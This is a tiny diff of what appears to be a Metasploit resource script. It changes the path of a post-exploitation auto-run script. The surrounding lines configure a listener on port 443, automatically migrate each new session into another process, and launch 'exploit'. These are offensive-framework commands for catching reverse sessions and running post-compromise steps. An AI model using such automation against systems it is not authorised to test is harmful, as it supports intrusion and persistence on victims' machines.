@@ -6,4 +6,4 @@ set LHOST
 set LPORT 443
 set InitialAutoRunScript migrate -f
 exploit
-set AutoRunScript /opt/scripts/resource/post.rc
+set AutoRunScript /opt/discover/resource/post.rc
